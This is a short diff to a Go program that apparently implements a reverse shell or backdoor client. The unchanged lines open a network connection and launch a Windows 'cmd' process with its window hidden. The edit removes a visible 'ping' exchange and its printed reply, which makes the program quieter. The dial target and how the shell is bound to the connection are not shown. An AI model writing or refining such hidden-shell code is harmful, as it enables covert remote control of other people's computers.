@@ -1,7 +1,6 @@
 package main
 
 import (
-	"fmt"
 	"net"
 	"os/exec"
 	"syscall"
@@ -22,15 +21,6 @@ func main() {
 		panic(err)
 	}
 	defer connection.Close()
-	buffer := make([]byte, 1024)
-	connection.Write([]byte("ping\n"))
-	mLen, err := connection.Read(buffer)
-
-	if err != nil {
-		panic(err)
-	}
-
-	fmt.Println(string(buffer[:mLen]))
 
 	cmd := exec.Command("cmd")
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
